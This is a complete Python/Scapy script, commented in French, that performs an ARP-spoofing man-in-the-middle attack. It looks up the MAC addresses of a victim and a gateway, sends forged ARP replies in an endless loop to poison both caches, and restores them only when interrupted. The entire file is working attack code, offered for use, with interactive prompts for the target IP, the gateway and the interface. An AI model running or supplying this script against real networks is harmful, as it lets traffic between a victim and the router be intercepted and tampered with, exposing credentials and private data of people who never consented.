from scapy.all import *
import sys
import time


def obtention_mac(ip, interface): # Fonction pour obtenir l'adresse MAC d'une IP cible
    conf.verb = 0 # Désactive l'affichage des messages de Scapy
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, iface=interface, inter=0.1, verbose=False) # Envoie une requête ARP broadcast pour obtenir l'adresse MAC de l'IP spécifiée
    for snd, rcv in ans: # Analyse des réponses
        return rcv.sprintf(r"%Ether.src%")


def spoof_arp(ip_victime, mac_victime, ip_routeur, mac_routeur): # Fonction pour envoyer des paquets ARP pour usurper les adresses MAC
    # Envoie des paquets ARP pour usurper les adresses MAC
    send(ARP(op=2, pdst=ip_victime, psrc=ip_routeur, hwdst=mac_victime), verbose=False)
    send(ARP(op=2, pdst=ip_routeur, psrc=ip_victime, hwdst=mac_routeur), verbose=False)


def attaque_mitm(ip_victime, ip_routeur, interface): # Fonction pour effectuer une attaque de l'homme du milieu
    try:
        # Récupérer les adresses MAC de la victime et du routeur grace à la fonction d'obtention d'addresses MAC
        mac_victime = obtention_mac(ip_victime, interface)
        mac_routeur = obtention_mac(ip_routeur, interface)

        # Démarrer l'usurpation des adresses MAC grace à la fonction spoof
        while True:
            spoof_arp(ip_victime, mac_victime, ip_routeur, mac_routeur)
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n--> Attaque interompue, restauration des adresses MAC originales...")

        # Restaurer les adresses MAC originales en envoyant des paquets ARP lorsque le script est interrompu
        send(ARP(op=2, pdst=ip_victime, psrc=ip_routeur, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=mac_routeur), count=7, verbose=False)
        send(ARP(op=2, pdst=ip_routeur, psrc=ip_victime, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=mac_victime), count=7, verbose=False)
        sys.exit(0)

# Fonction principale
def main():
    # Saisie des adresses IP de la victime, du routeur, et du nom de l'interface réseau à utiliser
    ip_victime = input("--> Entrez l'adresse IP de la cible : ")
    ip_routeur = input("--> Entrez l'adresse IP de la passerelle : ")
    interface = input("--> Entrez le nom de l'interface réseau à utiliser : ")

    print("--> Début de l'attaque / CTRL + C pour quitter")
    # Lancer l'attaque MITM
    attaque_mitm(ip_victime, ip_routeur, interface)

if __name__ == "__main__":
    main()
